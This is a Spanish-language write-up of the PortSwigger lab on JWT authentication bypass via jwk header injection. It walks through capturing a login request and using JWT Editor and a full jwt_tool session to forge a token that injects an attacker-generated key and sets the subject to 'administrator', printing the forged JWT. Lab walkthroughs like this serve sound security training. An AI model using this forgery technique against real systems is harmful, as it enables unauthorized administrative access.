---
description: >-
  https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection
---

# Lab 4: JWT authentication bypass via jwk header injection

La peticion de login es:

```
POST /login HTTP/2
Host: 0ab400c804f23b9e804ed1ef006e00a7.web-security-academy.net
Cookie: session=
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
Origin: https://0ab400c804f23b9e804ed1ef006e00a7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab400c804f23b9e804ed1ef006e00a7.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

csrf=gBFaqe25uUIop5StZfDiMJCbaOCOupXd&username=wiener&password=peter
```

La respuesta es:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiI0ODIxNTI1ZC1jMDQ2LTQ1NzctYjM5MC03YmU4NDljNWIxYTQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ1MTY5NCwic3ViIjoid2llbmVyIn0.dzuZARjsHewkR0begAVkIZJ2Hjy7L9HcicR_LJe18T6X9lWLERABb2q7wMc_gzPLJ9LrHHGk_UNQYfBk0geuHe4Tcn38tJTUJasapU0yTIHDgRyYeFUL_g1aoRlYNKJDK9sJHF56hQdQl4YvHoYla9dHTfyxVCufmEU39izgkK_b3ORBS7wIXv05H9zy0dPiGv2U7Ir-aR2fqROmgSiU9tkv57CctEshYLOCMTju5a2MzvpXInsAc_kiMK-e0EBj8Vdmzc5N7BWtY_erCzkmVHOd2UkEb38pEmBI9HLvm8K3rYiLX_VKO7Pr9aDji2eIiQWr-5zEGvqTYGITcC2btw; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

El JWT tiene la siguiente estructura:

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Luego de lo anterior generamos una RSA Key con la extension JWT Editor:

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Luego de la creacion queda asi:

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y luego simplemente utilizamos la extension:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Esto da como resultado acceso exitoso:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Utilizando JWT\_Tool

Capturamos el token y ejecutamos lo siguiente:

```bash
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# python3 jwt_tool.py eyJraWQiOiI4OTZkNGFlMC1hNTk0LTRiNTctYmUzNS1lNmUxODYxYmNjNjYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ1ODg5NCwic3ViIjoid2llbmVyIn0.ZmgD3cRLTXP222JX_7aHefcBzymW13740tM51o5JECiISZbi6Wp9HCXcQ1-n2db6lkRJmg7eCbtVmnR3IUkutl0kxxaW6kBme3urF0rWyrGqvXhFk5exMCCJNN0FxYFSQ2eXXovokHpJh1qJ7ZSx0X8or2NQPTlxGkZrb7w8KkvYEgNE4hP47rbuAA9m71uAtUWbNBnwcFja4RpawfWt-N23m8_cyWHLFX8C2s9IfXi02aEuxEBvQuv_SY_LgUx0_mZUIe9DCSjB4FEHRKeZGNcshdLFJ7kmlIqwHtOo4PVYZlHH8wfTU1un98tWvuKO2TrsU0c11CXoX50izseDdA -X i -T

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] kid = "896d4ae0-a594-4b57-be35-e6e1861bcc66"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of kid is: 896d4ae0-a594-4b57-be35-e6e1861bcc66
Please enter new value and hit ENTER
> jwt_tool
[1] kid = "jwt_tool"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] iss = "portswigger"
[2] exp = 1717458894    ==> TIMESTAMP = 2024-06-03 18:54:54 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of sub is: wiener
Please enter new value and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1717458894    ==> TIMESTAMP = 2024-06-03 18:54:54 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
key: /root/.jwt_tool/jwttool_custom_private_RSA.pem
jwttool_6a6bd332ae6ec708983a7afbcbc0d763 - EXPLOIT: injected JWKS
(This will only be valid on unpatched implementations of JWT.)
[+] eyJraWQiOiJqd3RfdG9vbCIsImFsZyI6IlJTMjU2IiwiandrIjp7Imt0eSI6IlJTQSIsImtpZCI6Imp3dF90b29sIiwidXNlIjoic2lnIiwiZSI6IkFRQUIiLCJuIjoicGo2SkxtUnBkUFJSUHVoN1JTMmlyM0NjRHJtd0lMcjRGZmotQVIwVkNDTi1oYk5fUjJScXVJbFZlUDdiT1RNaFNZazJTRzBKdm5tamtyMGkzc01WTVRpNjRMM3ZSREV1WTNlN08xYlJqRnJyZkt3NGhObjVzdkdmLXhONzRKblBGSkVxdnZJRXllay1CWDVlbzdzSGxQMW1hRHRhM0g5OFJYMEJja054alJTMGVYZnl4R19xLUs3NURENlNOWC1oeFIwMFd4NjBLWGtMVjVXdkNLTi1iMzR1TWNfVFhOM2pCWk8yeHBRMWw3V2xKMWZGaXM5LW1pRjIyMm9aOWlyc2YxT1k0QjY2SkJpXzBRYk92NjdsX1loTTFqX3V3Z21FNE5PSVlBMlZwaUhRakhCaW5GYW44V05qRE9YS0FveTNfS2YwUXRuVGpPV1VXUTA4U2tVeldRIn19.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ1ODg5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.hACLUwmHyD-mXZxKllkWdQIBEz4eKLsTkdQJlXesPL_7Qc9n56qa3ztYiWy_Ww1w0OZmh0_VPJM4KP2tsBBXwZZ2n0WJxvg3xLXXNHucmBkiunIal8jTV2i1F5_2Ifwa_M28r2r5FfkRrzuAwtnCVZaBpQjwxZNlP9MJLHDBGr044cs_duZ_uSzoLAER_9tZdptQk2AeFV3O_KhpN9hxlmF2vMv3B3pesPtJTcu5KAkhPqw4SicLVMZ-YmeTCtmCxCRrqoDFt_vrWZwmfHdiR-ki0It-e9bZzs_woGjnV5uBLNPOquLDzZqdC_O9CxCS7SaRWIIw6NiHZWBfdZE4Tw
```

El JWT previo permite autorizarnos como admin:

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

La generacion de este JWT tiene la siguiente sintaxis:

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
